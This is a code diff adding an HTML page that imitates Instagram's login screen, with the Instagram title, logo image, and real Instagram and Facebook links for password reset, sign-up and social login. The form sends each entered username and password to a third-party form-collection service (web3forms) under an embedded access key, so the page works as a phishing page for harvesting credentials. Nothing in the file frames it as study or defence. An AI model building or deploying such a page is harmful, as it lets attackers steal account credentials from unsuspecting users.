@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="log.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.1/css/font-awesome.css" integrity="sha512-LKG0Zi6duJ5mwncLtQVchN0iF8fWmcxApuX9pqGq7ITgwQDWR9EqZFsrV9TXfE9pPRa1J6GVnsBl7gKxAyllaA==" crossorigin="anonymous" referrerpolicy="no-referrer"
+    />
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="icon"> <img src="i.png">
+
+            <div class="login-box">
+
+                <h1>Instagram</h1>
+
+                <form action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="b78ee9cd-c1cd-45d8-a0f5-1feafca8e315">
+
+                    <input type="text" name="name" placeholder="Username" id="username" required>
+                    <input type="password" name="message" placeholder="Password" id="YourPassword" required>
+
+                    <input type="hidden" name="message" value="https://web3forms.com/success">
+
+                    <div class="strengthMeter show">
+                        <input type="checkbox" class="checkpassword">Show Password</span>
+                    </div>
+
+                    <button type="submit" class="btn">Log in</button>
+                </form>
+
+
+                <div class="fb">
+                    <a href="https://www.facebook.com/login/">
+                        <i class="fa fa-facebook-square">  Log in with Facebook</i>
+                    </a>
+                </div>
+
+                <div class="ps">
+                    <span> <a href="https://www.instagram.com/accounts/password/reset/?hl=en"> Forgot Password ? </a> </span>
+                </div>
+
+                <div class="signup">
+                    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a></p>
+                </div>
+            </div>
+        </div>
+        <script src="script.js"></script>
+
+
+        <script>
+            let password = document.querySelector("#YourPassword");
+            let show = document.querySelector(".show");
+            show.onclick = function() {
+                if (password.type === "password") {
+                    password.setAttribute("type", "text");
+                    show.classList.add("hide");
+                } else {
+                    password.setAttribute("type", "password");
+                    show.classList.remove("hide");
+                }
+            };
+        </script>
+</body>
+
+</html>
